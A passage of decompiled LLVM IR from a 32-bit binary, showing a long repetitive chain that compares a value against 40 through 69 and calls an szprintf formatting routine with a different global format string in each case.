  %v0_804a75b = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a75b = zext i8 %v0_804a75b to i32
  store i32 %v1_804a75b, i32* @edx, align 4
  %v0_804a765 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a765 = zext i8 %v0_804a765 to i32
  %v2_804a774 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a774, i32* @ebx, align 4
  %v4_804a786 = call i32 @szprintf(i32 %v2_804a774, i32 ptrtoint ([13 x i8]* @global_var_8058b25.81 to i32), i32 %v1_804a765)
  br label %dec_label_pc_804a78b

dec_label_pc_804a78b:                             ; preds = %dec_label_pc_804a755, %dec_label_pc_804a75b
  %v13_804a78b = icmp eq i32 %v2_8049efa, 40
  %v1_804a78f = icmp eq i1 %v13_804a78b, false
  br i1 %v1_804a78f, label %dec_label_pc_804a7c1, label %dec_label_pc_804a791

dec_label_pc_804a791:                             ; preds = %dec_label_pc_804a78b
  %v0_804a791 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a791 = zext i8 %v0_804a791 to i32
  store i32 %v1_804a791, i32* @edx, align 4
  %v0_804a79b = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a79b = zext i8 %v0_804a79b to i32
  %v2_804a7aa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7aa, i32* @ebx, align 4
  %v4_804a7bc = call i32 @szprintf(i32 %v2_804a7aa, i32 ptrtoint ([13 x i8]* @global_var_8058b18.80 to i32), i32 %v1_804a79b)
  br label %dec_label_pc_804a7c1

dec_label_pc_804a7c1:                             ; preds = %dec_label_pc_804a78b, %dec_label_pc_804a791
  %v13_804a7c1 = icmp eq i32 %v2_8049efa, 41
  %v1_804a7c5 = icmp eq i1 %v13_804a7c1, false
  br i1 %v1_804a7c5, label %dec_label_pc_804a7f7, label %dec_label_pc_804a7c7

dec_label_pc_804a7c7:                             ; preds = %dec_label_pc_804a7c1
  %v0_804a7c7 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a7c7 = zext i8 %v0_804a7c7 to i32
  store i32 %v1_804a7c7, i32* @edx, align 4
  %v0_804a7d1 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a7d1 = zext i8 %v0_804a7d1 to i32
  %v2_804a7e0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7e0, i32* @ebx, align 4
  %v4_804a7f2 = call i32 @szprintf(i32 %v2_804a7e0, i32 ptrtoint ([13 x i8]* @global_var_8058b32.82 to i32), i32 %v1_804a7d1)
  br label %dec_label_pc_804a7f7

dec_label_pc_804a7f7:                             ; preds = %dec_label_pc_804a7c1, %dec_label_pc_804a7c7
  %v13_804a7f7 = icmp eq i32 %v2_8049efa, 42
  %v1_804a7fb = icmp eq i1 %v13_804a7f7, false
  br i1 %v1_804a7fb, label %dec_label_pc_804a82d, label %dec_label_pc_804a7fd

dec_label_pc_804a7fd:                             ; preds = %dec_label_pc_804a7f7
  %v0_804a7fd = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a7fd = zext i8 %v0_804a7fd to i32
  store i32 %v1_804a7fd, i32* @edx, align 4
  %v0_804a807 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a807 = zext i8 %v0_804a807 to i32
  %v2_804a816 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a816, i32* @ebx, align 4
  %v4_804a828 = call i32 @szprintf(i32 %v2_804a816, i32 ptrtoint ([13 x i8]* @global_var_8058b3f.83 to i32), i32 %v1_804a807)
  br label %dec_label_pc_804a82d

dec_label_pc_804a82d:                             ; preds = %dec_label_pc_804a7f7, %dec_label_pc_804a7fd
  %v13_804a82d = icmp eq i32 %v2_8049efa, 43
  %v1_804a831 = icmp eq i1 %v13_804a82d, false
  br i1 %v1_804a831, label %dec_label_pc_804a863, label %dec_label_pc_804a833

dec_label_pc_804a833:                             ; preds = %dec_label_pc_804a82d
  %v0_804a833 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a833 = zext i8 %v0_804a833 to i32
  store i32 %v1_804a833, i32* @edx, align 4
  %v0_804a83d = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a83d = zext i8 %v0_804a83d to i32
  %v2_804a84c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a84c, i32* @ebx, align 4
  %v4_804a85e = call i32 @szprintf(i32 %v2_804a84c, i32 ptrtoint ([13 x i8]* @global_var_8058b4c.84 to i32), i32 %v1_804a83d)
  br label %dec_label_pc_804a863

dec_label_pc_804a863:                             ; preds = %dec_label_pc_804a82d, %dec_label_pc_804a833
  %v13_804a863 = icmp eq i32 %v2_8049efa, 44
  %v1_804a867 = icmp eq i1 %v13_804a863, false
  br i1 %v1_804a867, label %dec_label_pc_804a899, label %dec_label_pc_804a869

dec_label_pc_804a869:                             ; preds = %dec_label_pc_804a863
  %v0_804a869 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a869 = zext i8 %v0_804a869 to i32
  store i32 %v1_804a869, i32* @edx, align 4
  %v0_804a873 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a873 = zext i8 %v0_804a873 to i32
  %v2_804a882 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a882, i32* @ebx, align 4
  %v4_804a894 = call i32 @szprintf(i32 %v2_804a882, i32 ptrtoint ([13 x i8]* @global_var_8058b3f.83 to i32), i32 %v1_804a873)
  br label %dec_label_pc_804a899

dec_label_pc_804a899:                             ; preds = %dec_label_pc_804a863, %dec_label_pc_804a869
  %v13_804a899 = icmp eq i32 %v2_8049efa, 45
  %v1_804a89d = icmp eq i1 %v13_804a899, false
  br i1 %v1_804a89d, label %dec_label_pc_804a8cf, label %dec_label_pc_804a89f

dec_label_pc_804a89f:                             ; preds = %dec_label_pc_804a899
  %v0_804a89f = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a89f = zext i8 %v0_804a89f to i32
  store i32 %v1_804a89f, i32* @edx, align 4
  %v0_804a8a9 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a8a9 = zext i8 %v0_804a8a9 to i32
  %v2_804a8b8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8b8, i32* @ebx, align 4
  %v4_804a8ca = call i32 @szprintf(i32 %v2_804a8b8, i32 ptrtoint ([13 x i8]* @global_var_8058b59.85 to i32), i32 %v1_804a8a9)
  br label %dec_label_pc_804a8cf

dec_label_pc_804a8cf:                             ; preds = %dec_label_pc_804a899, %dec_label_pc_804a89f
  %v13_804a8cf = icmp eq i32 %v2_8049efa, 46
  %v1_804a8d3 = icmp eq i1 %v13_804a8cf, false
  br i1 %v1_804a8d3, label %dec_label_pc_804a905, label %dec_label_pc_804a8d5

dec_label_pc_804a8d5:                             ; preds = %dec_label_pc_804a8cf
  %v0_804a8d5 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a8d5 = zext i8 %v0_804a8d5 to i32
  store i32 %v1_804a8d5, i32* @edx, align 4
  %v0_804a8df = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a8df = zext i8 %v0_804a8df to i32
  %v2_804a8ee = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8ee, i32* @ebx, align 4
  %v4_804a900 = call i32 @szprintf(i32 %v2_804a8ee, i32 ptrtoint ([13 x i8]* @global_var_8058b66.86 to i32), i32 %v1_804a8df)
  br label %dec_label_pc_804a905

dec_label_pc_804a905:                             ; preds = %dec_label_pc_804a8cf, %dec_label_pc_804a8d5
  %v13_804a905 = icmp eq i32 %v2_8049efa, 47
  %v1_804a909 = icmp eq i1 %v13_804a905, false
  br i1 %v1_804a909, label %dec_label_pc_804a93b, label %dec_label_pc_804a90b

dec_label_pc_804a90b:                             ; preds = %dec_label_pc_804a905
  %v0_804a90b = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a90b = zext i8 %v0_804a90b to i32
  store i32 %v1_804a90b, i32* @edx, align 4
  %v0_804a915 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a915 = zext i8 %v0_804a915 to i32
  %v2_804a924 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a924, i32* @ebx, align 4
  %v4_804a936 = call i32 @szprintf(i32 %v2_804a924, i32 ptrtoint ([13 x i8]* @global_var_8058b73.87 to i32), i32 %v1_804a915)
  br label %dec_label_pc_804a93b

dec_label_pc_804a93b:                             ; preds = %dec_label_pc_804a905, %dec_label_pc_804a90b
  %v10_804a93b = icmp eq i32 %v2_8049efa, 48
  %v1_804a93f = icmp eq i1 %v10_804a93b, false
  br i1 %v1_804a93f, label %dec_label_pc_804a971, label %dec_label_pc_804a941

dec_label_pc_804a941:                             ; preds = %dec_label_pc_804a93b
  %v0_804a941 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a941 = zext i8 %v0_804a941 to i32
  store i32 %v1_804a941, i32* @edx, align 4
  %v0_804a94b = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a94b = zext i8 %v0_804a94b to i32
  %v2_804a95a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a95a, i32* @ebx, align 4
  %v4_804a96c = call i32 @szprintf(i32 %v2_804a95a, i32 ptrtoint ([13 x i8]* @global_var_8058b80.88 to i32), i32 %v1_804a94b)
  br label %dec_label_pc_804a971

dec_label_pc_804a971:                             ; preds = %dec_label_pc_804a93b, %dec_label_pc_804a941
  %v13_804a971 = icmp eq i32 %v2_8049efa, 49
  %v1_804a975 = icmp eq i1 %v13_804a971, false
  br i1 %v1_804a975, label %dec_label_pc_804a9a7, label %dec_label_pc_804a977

dec_label_pc_804a977:                             ; preds = %dec_label_pc_804a971
  %v0_804a977 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a977 = zext i8 %v0_804a977 to i32
  store i32 %v1_804a977, i32* @edx, align 4
  %v0_804a981 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a981 = zext i8 %v0_804a981 to i32
  %v2_804a990 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a990, i32* @ebx, align 4
  %v4_804a9a2 = call i32 @szprintf(i32 %v2_804a990, i32 ptrtoint ([13 x i8]* @global_var_8058b8d.89 to i32), i32 %v1_804a981)
  br label %dec_label_pc_804a9a7

dec_label_pc_804a9a7:                             ; preds = %dec_label_pc_804a971, %dec_label_pc_804a977
  %v13_804a9a7 = icmp eq i32 %v2_8049efa, 50
  %v1_804a9ab = icmp eq i1 %v13_804a9a7, false
  br i1 %v1_804a9ab, label %dec_label_pc_804a9dd, label %dec_label_pc_804a9ad

dec_label_pc_804a9ad:                             ; preds = %dec_label_pc_804a9a7
  %v0_804a9ad = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a9ad = zext i8 %v0_804a9ad to i32
  store i32 %v1_804a9ad, i32* @edx, align 4
  %v0_804a9b7 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a9b7 = zext i8 %v0_804a9b7 to i32
  %v2_804a9c6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9c6, i32* @ebx, align 4
  %v4_804a9d8 = call i32 @szprintf(i32 %v2_804a9c6, i32 ptrtoint ([13 x i8]* @global_var_8058b9a.90 to i32), i32 %v1_804a9b7)
  br label %dec_label_pc_804a9dd

dec_label_pc_804a9dd:                             ; preds = %dec_label_pc_804a9a7, %dec_label_pc_804a9ad
  %v13_804a9dd = icmp eq i32 %v2_8049efa, 51
  %v1_804a9e1 = icmp eq i1 %v13_804a9dd, false
  br i1 %v1_804a9e1, label %dec_label_pc_804aa13, label %dec_label_pc_804a9e3

dec_label_pc_804a9e3:                             ; preds = %dec_label_pc_804a9dd
  %v0_804a9e3 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a9e3 = zext i8 %v0_804a9e3 to i32
  store i32 %v1_804a9e3, i32* @edx, align 4
  %v0_804a9ed = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a9ed = zext i8 %v0_804a9ed to i32
  %v2_804a9fc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9fc, i32* @ebx, align 4
  %v4_804aa0e = call i32 @szprintf(i32 %v2_804a9fc, i32 ptrtoint ([14 x i8]* @global_var_8058ba7.91 to i32), i32 %v1_804a9ed)
  br label %dec_label_pc_804aa13

dec_label_pc_804aa13:                             ; preds = %dec_label_pc_804a9dd, %dec_label_pc_804a9e3
  %v13_804aa13 = icmp eq i32 %v2_8049efa, 52
  %v1_804aa17 = icmp eq i1 %v13_804aa13, false
  br i1 %v1_804aa17, label %dec_label_pc_804aa49, label %dec_label_pc_804aa19

dec_label_pc_804aa19:                             ; preds = %dec_label_pc_804aa13
  %v0_804aa19 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804aa19 = zext i8 %v0_804aa19 to i32
  store i32 %v1_804aa19, i32* @edx, align 4
  %v0_804aa23 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804aa23 = zext i8 %v0_804aa23 to i32
  %v2_804aa32 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa32, i32* @ebx, align 4
  %v4_804aa44 = call i32 @szprintf(i32 %v2_804aa32, i32 ptrtoint ([13 x i8]* @global_var_8058bb5.92 to i32), i32 %v1_804aa23)
  br label %dec_label_pc_804aa49

dec_label_pc_804aa49:                             ; preds = %dec_label_pc_804aa13, %dec_label_pc_804aa19
  %v13_804aa49 = icmp eq i32 %v2_8049efa, 53
  %v1_804aa4d = icmp eq i1 %v13_804aa49, false
  br i1 %v1_804aa4d, label %dec_label_pc_804aa7f, label %dec_label_pc_804aa4f

dec_label_pc_804aa4f:                             ; preds = %dec_label_pc_804aa49
  %v0_804aa4f = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804aa4f = zext i8 %v0_804aa4f to i32
  store i32 %v1_804aa4f, i32* @edx, align 4
  %v0_804aa59 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804aa59 = zext i8 %v0_804aa59 to i32
  %v2_804aa68 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa68, i32* @ebx, align 4
  %v4_804aa7a = call i32 @szprintf(i32 %v2_804aa68, i32 ptrtoint ([14 x i8]* @global_var_8058bc2.93 to i32), i32 %v1_804aa59)
  br label %dec_label_pc_804aa7f

dec_label_pc_804aa7f:                             ; preds = %dec_label_pc_804aa49, %dec_label_pc_804aa4f
  %v13_804aa7f = icmp eq i32 %v2_8049efa, 54
  %v1_804aa83 = icmp eq i1 %v13_804aa7f, false
  br i1 %v1_804aa83, label %dec_label_pc_804aab5, label %dec_label_pc_804aa85

dec_label_pc_804aa85:                             ; preds = %dec_label_pc_804aa7f
  %v0_804aa85 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804aa85 = zext i8 %v0_804aa85 to i32
  store i32 %v1_804aa85, i32* @edx, align 4
  %v0_804aa8f = load i8, i8* @global_var_805c539.40, align 1
  %v1_804aa8f = zext i8 %v0_804aa8f to i32
  %v2_804aa9e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa9e, i32* @ebx, align 4
  %v4_804aab0 = call i32 @szprintf(i32 %v2_804aa9e, i32 ptrtoint ([13 x i8]* @global_var_8058bd0.94 to i32), i32 %v1_804aa8f)
  br label %dec_label_pc_804aab5

dec_label_pc_804aab5:                             ; preds = %dec_label_pc_804aa7f, %dec_label_pc_804aa85
  %v13_804aab5 = icmp eq i32 %v2_8049efa, 55
  %v1_804aab9 = icmp eq i1 %v13_804aab5, false
  br i1 %v1_804aab9, label %dec_label_pc_804aaeb, label %dec_label_pc_804aabb

dec_label_pc_804aabb:                             ; preds = %dec_label_pc_804aab5
  %v0_804aabb = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804aabb = zext i8 %v0_804aabb to i32
  store i32 %v1_804aabb, i32* @edx, align 4
  %v0_804aac5 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804aac5 = zext i8 %v0_804aac5 to i32
  %v2_804aad4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aad4, i32* @ebx, align 4
  %v4_804aae6 = call i32 @szprintf(i32 %v2_804aad4, i32 ptrtoint ([14 x i8]* @global_var_8058bdd.95 to i32), i32 %v1_804aac5)
  br label %dec_label_pc_804aaeb

dec_label_pc_804aaeb:                             ; preds = %dec_label_pc_804aab5, %dec_label_pc_804aabb
  %v13_804aaeb = icmp eq i32 %v2_8049efa, 56
  %v1_804aaef = icmp eq i1 %v13_804aaeb, false
  br i1 %v1_804aaef, label %dec_label_pc_804ab21, label %dec_label_pc_804aaf1

dec_label_pc_804aaf1:                             ; preds = %dec_label_pc_804aaeb
  %v0_804aaf1 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804aaf1 = zext i8 %v0_804aaf1 to i32
  store i32 %v1_804aaf1, i32* @edx, align 4
  %v0_804aafb = load i8, i8* @global_var_805c539.40, align 1
  %v1_804aafb = zext i8 %v0_804aafb to i32
  %v2_804ab0a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab0a, i32* @ebx, align 4
  %v4_804ab1c = call i32 @szprintf(i32 %v2_804ab0a, i32 ptrtoint ([14 x i8]* @global_var_8058beb.96 to i32), i32 %v1_804aafb)
  br label %dec_label_pc_804ab21

dec_label_pc_804ab21:                             ; preds = %dec_label_pc_804aaeb, %dec_label_pc_804aaf1
  %v13_804ab21 = icmp eq i32 %v2_8049efa, 57
  %v1_804ab25 = icmp eq i1 %v13_804ab21, false
  br i1 %v1_804ab25, label %dec_label_pc_804ab57, label %dec_label_pc_804ab27

dec_label_pc_804ab27:                             ; preds = %dec_label_pc_804ab21
  %v0_804ab27 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804ab27 = zext i8 %v0_804ab27 to i32
  store i32 %v1_804ab27, i32* @edx, align 4
  %v0_804ab31 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804ab31 = zext i8 %v0_804ab31 to i32
  %v2_804ab40 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab40, i32* @ebx, align 4
  %v4_804ab52 = call i32 @szprintf(i32 %v2_804ab40, i32 ptrtoint ([13 x i8]* @global_var_8058bf9.97 to i32), i32 %v1_804ab31)
  br label %dec_label_pc_804ab57

dec_label_pc_804ab57:                             ; preds = %dec_label_pc_804ab21, %dec_label_pc_804ab27
  %v13_804ab57 = icmp eq i32 %v2_8049efa, 58
  %v1_804ab5b = icmp eq i1 %v13_804ab57, false
  br i1 %v1_804ab5b, label %dec_label_pc_804ab8d, label %dec_label_pc_804ab5d

dec_label_pc_804ab5d:                             ; preds = %dec_label_pc_804ab57
  %v0_804ab5d = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804ab5d = zext i8 %v0_804ab5d to i32
  store i32 %v1_804ab5d, i32* @edx, align 4
  %v0_804ab67 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804ab67 = zext i8 %v0_804ab67 to i32
  %v2_804ab76 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab76, i32* @ebx, align 4
  %v4_804ab88 = call i32 @szprintf(i32 %v2_804ab76, i32 ptrtoint ([13 x i8]* @global_var_8058c06.98 to i32), i32 %v1_804ab67)
  br label %dec_label_pc_804ab8d

dec_label_pc_804ab8d:                             ; preds = %dec_label_pc_804ab57, %dec_label_pc_804ab5d
  %v13_804ab8d = icmp eq i32 %v2_8049efa, 59
  %v1_804ab91 = icmp eq i1 %v13_804ab8d, false
  br i1 %v1_804ab91, label %dec_label_pc_804abc3, label %dec_label_pc_804ab93

dec_label_pc_804ab93:                             ; preds = %dec_label_pc_804ab8d
  %v0_804ab93 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804ab93 = zext i8 %v0_804ab93 to i32
  store i32 %v1_804ab93, i32* @edx, align 4
  %v0_804ab9d = load i8, i8* @global_var_805c539.40, align 1
  %v1_804ab9d = zext i8 %v0_804ab9d to i32
  %v2_804abac = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abac, i32* @ebx, align 4
  %v4_804abbe = call i32 @szprintf(i32 %v2_804abac, i32 ptrtoint ([13 x i8]* @global_var_8058c13.99 to i32), i32 %v1_804ab9d)
  br label %dec_label_pc_804abc3

dec_label_pc_804abc3:                             ; preds = %dec_label_pc_804ab8d, %dec_label_pc_804ab93
  %v13_804abc3 = icmp eq i32 %v2_8049efa, 60
  %v1_804abc7 = icmp eq i1 %v13_804abc3, false
  br i1 %v1_804abc7, label %dec_label_pc_804abf9, label %dec_label_pc_804abc9

dec_label_pc_804abc9:                             ; preds = %dec_label_pc_804abc3
  %v0_804abc9 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804abc9 = zext i8 %v0_804abc9 to i32
  store i32 %v1_804abc9, i32* @edx, align 4
  %v0_804abd3 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804abd3 = zext i8 %v0_804abd3 to i32
  %v2_804abe2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abe2, i32* @ebx, align 4
  %v4_804abf4 = call i32 @szprintf(i32 %v2_804abe2, i32 ptrtoint ([13 x i8]* @global_var_8058c20.100 to i32), i32 %v1_804abd3)
  br label %dec_label_pc_804abf9

dec_label_pc_804abf9:                             ; preds = %dec_label_pc_804abc3, %dec_label_pc_804abc9
  %v13_804abf9 = icmp eq i32 %v2_8049efa, 61
  %v1_804abfd = icmp eq i1 %v13_804abf9, false
  br i1 %v1_804abfd, label %dec_label_pc_804ac2f, label %dec_label_pc_804abff

dec_label_pc_804abff:                             ; preds = %dec_label_pc_804abf9
  %v0_804abff = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804abff = zext i8 %v0_804abff to i32
  store i32 %v1_804abff, i32* @edx, align 4
  %v0_804ac09 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804ac09 = zext i8 %v0_804ac09 to i32
  %v2_804ac18 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac18, i32* @ebx, align 4
  %v4_804ac2a = call i32 @szprintf(i32 %v2_804ac18, i32 ptrtoint ([13 x i8]* @global_var_8058c2d.101 to i32), i32 %v1_804ac09)
  br label %dec_label_pc_804ac2f

dec_label_pc_804ac2f:                             ; preds = %dec_label_pc_804abf9, %dec_label_pc_804abff
  %v13_804ac2f = icmp eq i32 %v2_8049efa, 62
  %v1_804ac33 = icmp eq i1 %v13_804ac2f, false
  br i1 %v1_804ac33, label %dec_label_pc_804ac65, label %dec_label_pc_804ac35

dec_label_pc_804ac35:                             ; preds = %dec_label_pc_804ac2f
  %v0_804ac35 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804ac35 = zext i8 %v0_804ac35 to i32
  store i32 %v1_804ac35, i32* @edx, align 4
  %v0_804ac3f = load i8, i8* @global_var_805c539.40, align 1
  %v1_804ac3f = zext i8 %v0_804ac3f to i32
  %v2_804ac4e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac4e, i32* @ebx, align 4
  %v4_804ac60 = call i32 @szprintf(i32 %v2_804ac4e, i32 ptrtoint ([13 x i8]* @global_var_8058c3a.102 to i32), i32 %v1_804ac3f)
  br label %dec_label_pc_804ac65

dec_label_pc_804ac65:                             ; preds = %dec_label_pc_804ac2f, %dec_label_pc_804ac35
  %v13_804ac65 = icmp eq i32 %v2_8049efa, 63
  %v1_804ac69 = icmp eq i1 %v13_804ac65, false
  br i1 %v1_804ac69, label %dec_label_pc_804ac9b, label %dec_label_pc_804ac6b

dec_label_pc_804ac6b:                             ; preds = %dec_label_pc_804ac65
  %v0_804ac6b = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804ac6b = zext i8 %v0_804ac6b to i32
  store i32 %v1_804ac6b, i32* @edx, align 4
  %v0_804ac75 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804ac75 = zext i8 %v0_804ac75 to i32
  %v2_804ac84 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac84, i32* @ebx, align 4
  %v4_804ac96 = call i32 @szprintf(i32 %v2_804ac84, i32 ptrtoint ([13 x i8]* @global_var_8058c47.103 to i32), i32 %v1_804ac75)
  br label %dec_label_pc_804ac9b

dec_label_pc_804ac9b:                             ; preds = %dec_label_pc_804ac65, %dec_label_pc_804ac6b
  %v10_804ac9b = icmp eq i32 %v2_8049efa, 64
  %v1_804ac9f = icmp eq i1 %v10_804ac9b, false
  br i1 %v1_804ac9f, label %dec_label_pc_804acd1, label %dec_label_pc_804aca1

dec_label_pc_804aca1:                             ; preds = %dec_label_pc_804ac9b
  %v0_804aca1 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804aca1 = zext i8 %v0_804aca1 to i32
  store i32 %v1_804aca1, i32* @edx, align 4
  %v0_804acab = load i8, i8* @global_var_805c539.40, align 1
  %v1_804acab = zext i8 %v0_804acab to i32
  %v2_804acba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804acba, i32* @ebx, align 4
  %v4_804accc = call i32 @szprintf(i32 %v2_804acba, i32 ptrtoint ([13 x i8]* @global_var_8058c54.104 to i32), i32 %v1_804acab)
  br label %dec_label_pc_804acd1

dec_label_pc_804acd1:                             ; preds = %dec_label_pc_804ac9b, %dec_label_pc_804aca1
  %v13_804acd1 = icmp eq i32 %v2_8049efa, 65
  %v1_804acd5 = icmp eq i1 %v13_804acd1, false
  br i1 %v1_804acd5, label %dec_label_pc_804ad07, label %dec_label_pc_804acd7

dec_label_pc_804acd7:                             ; preds = %dec_label_pc_804acd1
  %v0_804acd7 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804acd7 = zext i8 %v0_804acd7 to i32
  store i32 %v1_804acd7, i32* @edx, align 4
  %v0_804ace1 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804ace1 = zext i8 %v0_804ace1 to i32
  %v2_804acf0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804acf0, i32* @ebx, align 4
  %v4_804ad02 = call i32 @szprintf(i32 %v2_804acf0, i32 ptrtoint ([13 x i8]* @global_var_8058c61.105 to i32), i32 %v1_804ace1)
  br label %dec_label_pc_804ad07

dec_label_pc_804ad07:                             ; preds = %dec_label_pc_804acd1, %dec_label_pc_804acd7
  %v13_804ad07 = icmp eq i32 %v2_8049efa, 66
  %v1_804ad0b = icmp eq i1 %v13_804ad07, false
  br i1 %v1_804ad0b, label %dec_label_pc_804ad3d, label %dec_label_pc_804ad0d

dec_label_pc_804ad0d:                             ; preds = %dec_label_pc_804ad07
  %v0_804ad0d = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804ad0d = zext i8 %v0_804ad0d to i32
  store i32 %v1_804ad0d, i32* @edx, align 4
  %v0_804ad17 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804ad17 = zext i8 %v0_804ad17 to i32
  %v2_804ad26 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad26, i32* @ebx, align 4
  %v4_804ad38 = call i32 @szprintf(i32 %v2_804ad26, i32 ptrtoint ([13 x i8]* @global_var_8058c6e.106 to i32), i32 %v1_804ad17)
  br label %dec_label_pc_804ad3d

dec_label_pc_804ad3d:                             ; preds = %dec_label_pc_804ad07, %dec_label_pc_804ad0d
  %v13_804ad3d = icmp eq i32 %v2_8049efa, 67
  %v1_804ad41 = icmp eq i1 %v13_804ad3d, false
  br i1 %v1_804ad41, label %dec_label_pc_804ad73, label %dec_label_pc_804ad43

dec_label_pc_804ad43:                             ; preds = %dec_label_pc_804ad3d
  %v0_804ad43 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804ad43 = zext i8 %v0_804ad43 to i32
  store i32 %v1_804ad43, i32* @edx, align 4
  %v0_804ad4d = load i8, i8* @global_var_805c539.40, align 1
  %v1_804ad4d = zext i8 %v0_804ad4d to i32
  %v2_804ad5c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad5c, i32* @ebx, align 4
  %v4_804ad6e = call i32 @szprintf(i32 %v2_804ad5c, i32 ptrtoint ([13 x i8]* @global_var_8058c7b.107 to i32), i32 %v1_804ad4d)
  br label %dec_label_pc_804ad73

dec_label_pc_804ad73:                             ; preds = %dec_label_pc_804ad3d, %dec_label_pc_804ad43
  %v13_804ad73 = icmp eq i32 %v2_8049efa, 68
  %v1_804ad77 = icmp eq i1 %v13_804ad73, false
  br i1 %v1_804ad77, label %dec_label_pc_804ada9, label %dec_label_pc_804ad79

dec_label_pc_804ad79:                             ; preds = %dec_label_pc_804ad73
  %v0_804ad79 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804ad79 = zext i8 %v0_804ad79 to i32
  store i32 %v1_804ad79, i32* @edx, align 4
  %v0_804ad83 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804ad83 = zext i8 %v0_804ad83 to i32
  %v2_804ad92 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad92, i32* @ebx, align 4
  %v4_804ada4 = call i32 @szprintf(i32 %v2_804ad92, i32 ptrtoint ([13 x i8]* @global_var_8058c88.108 to i32), i32 %v1_804ad83)
  br label %dec_label_pc_804ada9

dec_label_pc_804ada9:                             ; preds = %dec_label_pc_804ad73, %dec_label_pc_804ad79
  %v13_804ada9 = icmp eq i32 %v2_8049efa, 69
  %v1_804adad = icmp eq i1 %v13_804ada9, false
  br i1 %v1_804adad, label %dec_label_pc_804addf, label %dec_label_pc_804adaf

dec_label_pc_804adaf:                             ; preds = %dec_label_pc_804ada9
  %v0_804adaf = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804adaf = zext i8 %v0_804adaf to i32
  store i32 %v1_804adaf, i32* @edx, align 4
  %v0_804adb9 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804adb9 = zext i8 %v0_804adb9 to i32
  %v2_804adc8 = ptrtoint i32* %stack_var_-28 to i32
